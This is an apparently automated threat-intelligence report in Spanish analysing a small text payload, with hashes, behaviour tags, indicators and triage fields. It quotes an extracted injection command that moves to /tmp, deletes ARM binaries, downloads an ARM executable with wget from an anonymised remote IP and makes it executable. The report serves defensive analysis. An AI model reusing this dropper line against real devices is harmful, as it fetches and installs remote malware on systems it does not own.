# 🧬 Payload Analysis

`7029b7337230d630fc72ee3d7cf41efb39d124b8142efb7f533e7933344e28bb`

## 📌 Resumen

Artefacto de 250 B. Formato identificado como ASCII text, with no line terminators. Entropía registrada: 4.62. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `7029b7337230d630fc72ee3d7cf41efb39d124b8142efb7f533e7933344e28bb`
- **SHA1:** `0ccc92b42b4931923a13c02d1998051e271b61aa`
- **MD5:** `f9137a031a720fde3519995205de2c8f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 250 B |
| Entropía | 4.62 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
startip=1.1.1.XXX;cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 201.51.13.XXX | static_analysis |
| ip | 2.2.2.XXX | static_analysis |
| ip | 1.1.1.XXX | static_analysis |
| command | startip=1.1.1.XXX;cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai | strings |
| hash | 7029b7337230d630fc72ee3d7cf41efb39d124b8142efb7f533e7933344e28bb | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
